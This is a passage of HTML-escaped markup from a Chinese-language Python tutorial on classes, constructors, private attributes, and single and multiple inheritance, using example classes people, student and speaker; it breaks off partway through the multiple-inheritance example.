&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#类定义&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;people&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#定义基本属性&lt;/span&gt;
    name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
    age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#定义私有属性,私有属性在类外部无法直接进行访问&lt;/span&gt;
    __weight &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#定义构造方法&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; n
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__weight &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; w
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;speak&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s 说: 我 %d 岁。&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;# 实例化类&lt;/span&gt;
p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; people&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;speak&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
runoob 说: 我 10 岁。
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;继承&#34;&gt;&lt;a href=&#34;#继承&#34; class=&#34;headerlink&#34; title=&#34;继承&#34;&gt;&lt;/a&gt;继承&lt;/h3&gt;&lt;p&gt;子类（派生类 DerivedClassName）会继承父类（基类 BaseClassName）的属性和方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;DerivedClassName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;BaseClassName&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;statement&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;statement&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;N&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;基类定义在另一个模块中时&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;DerivedClassName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;modname&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;BaseClassName&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#类定义&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;people&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#定义基本属性&lt;/span&gt;
    name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
    age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#定义私有属性,私有属性在类外部无法直接进行访问&lt;/span&gt;
    __weight &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#定义构造方法&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; n
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__weight &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; w
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;speak&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s 说: 我 %d 岁。&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;#单继承示例&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;student&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;people&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    grade &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#调用父类的构函&lt;/span&gt;
        people&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__init__&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grade &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; g
    &lt;span class=&#34;token comment&#34;&gt;#覆写父类的方法&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;speak&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s 说: 我 %d 岁了，我在读 %d 年级&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grade&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
 
 
s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; student&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ken&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;speak&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
ken 说: 我 10 岁了，我在读 3 年级
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;继承时可以直接调用父类构造函数，再添加新的变量&lt;/li&gt;
&lt;li&gt;父类的方法也能直接调用或者重写&lt;/li&gt;
&lt;li&gt;子类不重写 **_&lt;em&gt;init&lt;/em&gt;&lt;em&gt;**，实例化子类时，会自动调用父类定义的 **_&lt;em&gt;init&lt;/em&gt;&lt;/em&gt;**&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;多继承&#34;&gt;&lt;a href=&#34;#多继承&#34; class=&#34;headerlink&#34; title=&#34;多继承&#34;&gt;&lt;/a&gt;多继承&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;DerivedClassName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Base1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; Base2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; Base3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;statement&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;statement&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;N&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;若是父类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找父类中是否包含方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#类定义&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;people&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#定义基本属性&lt;/span&gt;
    name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
    age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#定义私有属性,私有属性在类外部无法直接进行访问&lt;/span&gt;
    __weight &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#定义构造方法&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; n
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__weight &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; w
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;speak&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s 说: 我 %d 岁。&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;#单继承示例&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;student&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;people&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    grade &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#调用父类的构函&lt;/span&gt;
        people&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__init__&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grade &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; g
    &lt;span class=&#34;token comment&#34;&gt;#覆写父类的方法&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;speak&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s 说: 我 %d 岁了，我在读 %d 年级&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grade&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;#另一个类，多重继承之前的准备&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;speaker&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    topic &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
    name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; n
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;topic &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; t
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;speak&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;我叫 %s，我是一个演说家，我演讲的主题是 %s&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;topic&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;#多重继承&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;sample&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;speaker&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;student&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
